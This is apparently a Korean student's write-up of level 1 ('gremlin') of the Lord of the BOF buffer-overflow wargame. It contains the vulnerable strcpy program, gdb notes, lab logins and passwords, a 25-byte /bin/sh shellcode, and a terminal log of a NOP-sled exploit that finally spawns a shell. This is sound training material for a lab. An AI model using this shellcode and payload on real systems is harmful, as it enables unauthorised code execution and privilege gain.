@@ -1,0 +1,406 @@
+[1단계: 그램린]
+----------------------------------------------
+int main(int argc, char *argv[])
+{
+    char buffer[256];
+    if(argc < 2){
+        printf("argv error\n");
+        exit(0);
+    }
+    strcpy(buffer, argv[1]);
+    printf("%s\n", buffer);
+}
+-------------------------------------------------
+
+-메인함수는 인자를 전달받을 수 있는데
+ 이는 (int argc, char *argv[]) 이런 식으로 짜여지며
+ 이때 argc는 옵션의 개수 argv는 옵션을 의미한다. 이때 
+ 옵션이란 프로그램을 실시할때의 명령문의 각 음절의 의미한다.
+
+ 예를 들어 "gremlim 12 123"라고 프로그램을 실시한다고 치면
+ gremlin이 첫번째 옵션으로 argv[0], 12가 argv[1] 123이 argv[2]
+ 에 들어가며 argc는 3이라는 값이 들어가게 된다.
+ 위 코드는 argc가 2보다 작다면 에러가 입력값이 없는 격이 되므로 에러가 나게 했다.
+
+-----------------------------------------------------------------------------------------
+[강의자료]
+vmware 마우스 벗어나기
+ctrl+alt
+//////////////////////////////////////////////////
+id: gate
+pw: gate
+
+ip확인하는 방법
+/sbin/ifconfig
+
+0xff를 다르게 바꾸는 버그해결방법(꼭 입력하고 시작하세요!!!!)
+bash2
+
+-컴파일(처음 보이는 파일은 권한문제로 gdb로 실행이 안되기 때문에 파일을 하나 만듭니다. 주의사항: 원래 있던 파일명과 글자수를 같게 하는것이 좋습니다.)
+gcc -o 파일명 소스코드
+ex) gcc -o gremlim gremlin.c
+//////////////////////////////////////////////////
+디버그
+gdb 파일명
+ex)gdb gremlim
+(gremlim은 만든 파일명입니다.)
+
+intel아키텍쳐로 바꾸기
+set disassembly-flavor intel
+
+main의 어셈블리코드 보기
+disas main
+
+정보확인(file, break point)
+info 명령어
+info b
+
+중단지점(break point)설정
+b * 주소
+b*main
+
+중단지점 삭제
+d 중단지점 번호
+
+프로그램 실행
+r
+
+다음 break point 까지
+c
+
+코드 한단계 실행
+ni
+
+출력
+p 출력할 내용
+
+주소 보기
+x/x (레지스터= $레지스터, 주소=0x주소)
+//////////////////////////////////////////////////
+payload
+32bit환경
+buf[256]+dummy[???]+sfp[4] + ret[4]
+
+25byte 쉘코드
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
+
+test
+r `python -c"print 'a'*260 + 'bbbb'"`
+
+ret: buffer의 쉘코드 이전의 위치를 주소로 지정:0x0bffff990
+\x90(215byte)+쉘코드(25byte)+\x90(20byte)+ret[\x90\xf9\xff\xbf]
+./gremlin `python -c "print '\x90'*231 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' +'\x90'*4+ '\x90\xf9\xff\xbf'"`
+//////////////////////////////////////////////////
+password보기
+my-pass
+
+다음레벨로 이동
+su - level명
+ex. gremlin
+-----------------------------------------------------------------------------------------
+[성공하기 전까지의 전문] 
+
+                          _______________________
+  _______________________-------------------                       `\
+ /:--__                                                              |
+||< > |                                   ___________________________/
+| \__/_________________-------------------                         |
+|                                                                  |
+ |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
+ |                                                                  |
+ |                                                                  |
+  |       [enter to the dungeon]                                    |
+  |       gate : gate                                                |
+  |                                                                  |
+  |       [RULE]                                                     |
+   |      - do not use local root exploit                             |
+   |      - do not use LD_PRELOAD to my-pass                          |
+   |      - do not use single boot                    [h4ck3rsch001] |
+  |                                              ____________________|_
+  |  ___________________-------------------------                      `\
+  |/`--_                                                                 |
+  ||[ ]||                                            ___________________/
+   \===/___________________--------------------------
+
+
+login: gate
+Password:
+Last login: Tue Apr 14 21:16:42 from 192.168.198.1
+[gate@localhost gate]$ bash
+[gate@localhost gate]$ bahs2
+bash: bahs2: command not found
+[gate@localhost gate]$ q
+bash: q: command not found
+[gate@localhost gate]$ bashw
+bash: bashw: command not found
+[gate@localhost gate]$ bash2
+[gate@localhost gate]$ ls
+gremlim  gremlin  gremlin.c
+[gate@localhost gate]$ gdb gremlim
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048430 <main>:       push   %ebp
+0x8048431 <main+1>:     mov    %ebp,%esp
+0x8048433 <main+3>:     sub    %esp,0x100
+0x8048439 <main+9>:     cmp    DWORD PTR [%ebp+8],1
+0x804843d <main+13>:    jg     0x8048456 <main+38>
+0x804843f <main+15>:    push   0x80484e0
+0x8048444 <main+20>:    call   0x8048350 <printf>
+0x8048449 <main+25>:    add    %esp,4
+0x804844c <main+28>:    push   0
+0x804844e <main+30>:    call   0x8048360 <exit>
+0x8048453 <main+35>:    add    %esp,4
+0x8048456 <main+38>:    mov    %eax,DWORD PTR [%ebp+12]
+0x8048459 <main+41>:    add    %eax,4
+0x804845c <main+44>:    mov    %edx,DWORD PTR [%eax]
+0x804845e <main+46>:    push   %edx
+0x804845f <main+47>:    lea    %eax,[%ebp-256]
+0x8048465 <main+53>:    push   %eax
+0x8048466 <main+54>:    call   0x8048370 <strcpy>
+0x804846b <main+59>:    add    %esp,8
+0x804846e <main+62>:    lea    %eax,[%ebp-256]
+0x8048474 <main+68>:    push   %eax
+0x8048475 <main+69>:    push   0x80484ec
+---Type <return> to continue, or q <return> to quit---q
+Quit
+(gdb) b*main+62
+Breakpoint 1 at 0x804846e
+(gdb) d main+62
+Argument required (breakpoint number).
+(gdb) b*main+62
+Note: breakpoint 1 also set at pc 0x804846e.
+Breakpoint 2 at 0x804846e
+(gdb) r `python -c"print 'a'*260+'bbbb'"`
+Starting program: /home/gate/gremlim `python -c"print 'a'*260+'bbbb'"`
+
+Breakpoint 1, 0x804846e in main ()
+(gdb) c
+Continuing.
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62626262 in ?? ()
+(gdb) x/100x $esp
+0xbffffa30:     0x00000000      0xbffffa74      0xbffffa80      0x40013868
+0xbffffa40:     0x00000002      0x08048380      0x00000000      0x080483a1
+0xbffffa50:     0x08048430      0x00000002      0xbffffa74      0x080482e0
+0xbffffa60:     0x080484bc      0x4000ae60      0xbffffa6c      0x40013e90
+0xbffffa70:     0x00000002      0xbffffb6b      0xbffffb7e      0x00000000
+0xbffffa80:     0xbffffc87      0xbffffca9      0xbffffcb3      0xbffffcc1
+0xbffffa90:     0xbffffce0      0xbffffced      0xbffffd06      0xbffffd20
+0xbffffaa0:     0xbffffd3f      0xbffffd4a      0xbffffd58      0xbffffd98
+0xbffffab0:     0xbffffda8      0xbffffdbd      0xbffffdcd      0xbffffdd7
+0xbffffac0:     0xbffffdf3      0xbffffdfe      0xbffffe0f      0xbffffe1e
+0xbffffad0:     0xbffffe26      0x00000000      0x00000003      0x08048034
+0xbffffae0:     0x00000004      0x00000020      0x00000005      0x00000006
+0xbffffaf0:     0x00000006      0x00001000      0x00000007      0x40000000
+0xbffffb00:     0x00000008      0x00000000      0x00000009      0x08048380
+0xbffffb10:     0x0000000b      0x000001f4      0x0000000c      0x000001f4
+0xbffffb20:     0x0000000d      0x000001f4      0x0000000e      0x000001f4
+0xbffffb30:     0x00000010      0x0f8bfbff      0x0000000f      0xbffffb66
+0xbffffb40:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffb50:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffb60:     0x00000000      0x36690000      0x2f003638      0x656d6f68
+0xbffffb70:     0x7461672f      0x72672f65      0x696c6d65      0x6161006d
+0xbffffb80:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffb90:     0x61616161      0x61616161      0x61616161      0x61616161
+---Type <return> to continue, or q <return> to quit---x/100x $esp-300
+0xbffffba0:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffbb0:     0x61616161      0x61616161      0x61616161      0x61616161
+(gdb) x
+0xbffffbc0:     0x61616161
+(gdb) q
+The program is running.  Exit anyway? (y or n) n
+Not confirmed.
+(gdb) x/100x $esp-100
+0xbffff9cc:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9dc:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9ec:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9fc:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffa0c:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffa1c:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffa2c:     0x62626262      0x00000000      0xbffffa74      0xbffffa80
+0xbffffa3c:     0x40013868      0x00000002      0x08048380      0x00000000
+0xbffffa4c:     0x080483a1      0x08048430      0x00000002      0xbffffa74
+0xbffffa5c:     0x080482e0      0x080484bc      0x4000ae60      0xbffffa6c
+0xbffffa6c:     0x40013e90      0x00000002      0xbffffb6b      0xbffffb7e
+0xbffffa7c:     0x00000000      0xbffffc87      0xbffffca9      0xbffffcb3
+0xbffffa8c:     0xbffffcc1      0xbffffce0      0xbffffced      0xbffffd06
+0xbffffa9c:     0xbffffd20      0xbffffd3f      0xbffffd4a      0xbffffd58
+0xbffffaac:     0xbffffd98      0xbffffda8      0xbffffdbd      0xbffffdcd
+0xbffffabc:     0xbffffdd7      0xbffffdf3      0xbffffdfe      0xbffffe0f
+0xbffffacc:     0xbffffe1e      0xbffffe26      0x00000000      0x00000003
+0xbffffadc:     0x08048034      0x00000004      0x00000020      0x00000005
+0xbffffaec:     0x00000006      0x00000006      0x00001000      0x00000007
+0xbffffafc:     0x40000000      0x00000008      0x00000000      0x00000009
+0xbffffb0c:     0x08048380      0x0000000b      0x000001f4      0x0000000c
+0xbffffb1c:     0x000001f4      0x0000000d      0x000001f4      0x0000000e
+0xbffffb2c:     0x000001f4      0x00000010      0x0f8bfbff      0x0000000f
+---Type <return> to continue, or q <return> to quit---x/100x $esp-200
+0xbffffb3c:     0xbffffb66      0x00000000      0x00000000      0x00000000
+0xbffffb4c:     0x00000000      0x00000000      0x00000000      0x00000000
+(gdb) x/100x $esp-200
+0xbffff968:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff978:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff988:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff998:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9a8:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9b8:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9c8:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9d8:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9e8:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9f8:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffa08:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffa18:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffa28:     0x61616161      0x62626262      0x00000000      0xbffffa74
+0xbffffa38:     0xbffffa80      0x40013868      0x00000002      0x08048380
+0xbffffa48:     0x00000000      0x080483a1      0x08048430      0x00000002
+0xbffffa58:     0xbffffa74      0x080482e0      0x080484bc      0x4000ae60
+0xbffffa68:     0xbffffa6c      0x40013e90      0x00000002      0xbffffb6b
+0xbffffa78:     0xbffffb7e      0x00000000      0xbffffc87      0xbffffca9
+0xbffffa88:     0xbffffcb3      0xbffffcc1      0xbffffce0      0xbffffced
+0xbffffa98:     0xbffffd06      0xbffffd20      0xbffffd3f      0xbffffd4a
+0xbffffaa8:     0xbffffd58      0xbffffd98      0xbffffda8      0xbffffdbd
+0xbffffab8:     0xbffffdcd      0xbffffdd7      0xbffffdf3      0xbffffdfe
+0xbffffac8:     0xbffffe0f      0xbffffe1e      0xbffffe26      0x00000000
+---Type <return> to continue, or q <return> to quit---
+0xbffffad8:     0x00000003      0x08048034      0x00000004      0x00000020
+0xbffffae8:     0x00000005      0x00000006      0x00000006      0x00001000
+(gdb) x/100x $esp-300
+0xbffff904:     0x40066070      0x40106980      0x080484ec      0xbffff928
+0xbffff914:     0x401081ec      0xbffffa28      0x0804847f      0x080484ec
+0xbffff924:     0xbffff928      0x61616161      0x61616161      0x61616161
+0xbffff934:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff944:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff954:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff964:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff974:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff984:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff994:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9a4:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9b4:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9c4:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9d4:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9e4:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffff9f4:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffa04:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffa14:     0x61616161      0x61616161      0x61616161      0x61616161
+0xbffffa24:     0x61616161      0x61616161      0x62626262      0x00000000
+0xbffffa34:     0xbffffa74      0xbffffa80      0x40013868      0x00000002
+0xbffffa44:     0x08048380      0x00000000      0x080483a1      0x08048430
+0xbffffa54:     0x00000002      0xbffffa74      0x080482e0      0x080484bc
+0xbffffa64:     0x4000ae60      0xbffffa6c      0x40013e90      0x00000002
+---Type <return> to continue, or q <return> to quit---
+0xbffffa74:     0xbffffb6b      0xbffffb7e      0x00000000      0xbffffc87
+0xbffffa84:     0xbffffca9      0xbffffcb3      0xbffffcc1      0xbffffce0
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+[gate@localhost gate]$
+[gate@localhost gate]$ r `python '-c print "\x90"*100'`+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80 `python '-c print"\x90"*135'`\x34\xf9\xff\xbf
+  File "<string>", line 1
+    print "\x90"*100
+    ^
+SyntaxError: invalid syntax
+  File "<string>", line 1
+    print"\x90"*135
+    ^
+SyntaxError: invalid syntax
+bash2: r: command not found
+[gate@localhost gate]$ info b
+
+[gate@localhost gate]$ gdb gremlim
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) r `python '-c print "\x90"*100'`+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80 `python '-c print"\x90"*135'`\x34\xf9\xff\xbf
+Starting program: /home/gate/gremlim `python '-c print "\x90"*100'`+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80 `python '-c print"\x90"*135'`\x34\xf9\xff\xbf
+  File "<string>", line 1
+    print "\x90"*100
+    ^
+SyntaxError: invalid syntax
+  File "<string>", line 1
+    print"\x90"*135
+    ^
+SyntaxError: invalid syntax
++x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1x89xc2xb0x0bxcdx80
+
+Program exited with code 0115.
+(gdb)  r `python '-c print "\x90"*100'`+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80 `python '-c print"\x90"*135'`\x34\xf9\xff\xbf
+Starting program: /home/gate/gremlim `python '-c print "\x90"*100'`+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80 `python '-c print"\x90"*135'`\x34\xf9\xff\xbf
+  File "<string>", line 1
+    print "\x90"*100
+    ^
+SyntaxError: invalid syntax
+  File "<string>", line 1
+    print"\x90"*135
+    ^
+SyntaxError: invalid syntax
++x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1x89xc2xb0x0bxcdx80
+
+Program exited with code 0115.
+(gdb)  r `python '-c print "\x90"*100'`+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80 `python '-c print"\x90"*135'`\x34\xf9\xff\xbf
+Starting program: /home/gate/gremlim `python '-c print "\x90"*100'`+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80 `python '-c print"\x90"*135'`\x34\xf9\xff\xbf
+  File "<string>", line 1
+    print "\x90"*100
+    ^
+SyntaxError: invalid syntax
+  File "<string>", line 1
+    print"\x90"*135
+    ^
+SyntaxError: invalid syntax
++x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1x89xc2xb0x0bxcdx80
+
+Program exited with code 0115.
+(gdb) r `python -c "print '\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'+'\x90'*135+'\x34\xf9\xff\xbf'"`
+Starting program: /home/gate/gremlim `python -c "print '\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'+'\x90'*135+'\x34\xf9\xff\xbf'"`
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
+                                        ̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒4▒
+
+Program received signal SIGSEGV, Segmentation fault.
+0x4000f935 in __profil (sample_buffer=Cannot access memory at address 0x90909098
+) at ../sysdeps/posix/profil.c:77
+77      ../sysdeps/posix/profil.c: No such file or directory.
+(gdb) my-pass
+Undefined command: "my-pass".  Try "help".
+(gdb) password
+Undefined command: "password".  Try "help".
+(gdb) id
+Undefined command: "id".  Try "help".
+(gdb) q
+The program is running.  Exit anyway? (y or n)
+Please answer y or n.
+The program is running.  Exit anyway? (y or n) y
+[gate@localhost gate]$ ./gremlin `python -c "print '\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'+'\x90'*135+'\x34\xf9\xff\xbf'"`
+//최종 공격 오버로드(성공)
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
+                                        ̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒4▒▒▒
+bash$ my-pass
+euid = 501
+hello bof world
+bash$
+
+
+-막혔던 내용- python 페이로드 형식
+
+`python -c'(들어갈 내용~~)'`
+
+->1. 잘은 모르겠는데 들어갈 내용 안에 문자는 ""로 감싸고 쉘코드 주소같은 문자열은 ''로 감싼다.
+
+->2. 들어갈 내용중에 python의 연산을 이용할때는 뭐로 감싸지 말고 그냥 쓴다.
+
+e.g)
+./gremlin `python -c "print '\x90'*100+'\x31\xc0\x50\x68\x80'+'\x90'*135+'\x34\xf9\xff\xbf'"`
+
+"+"기호로 사이 이어주는거 잊지말고!!
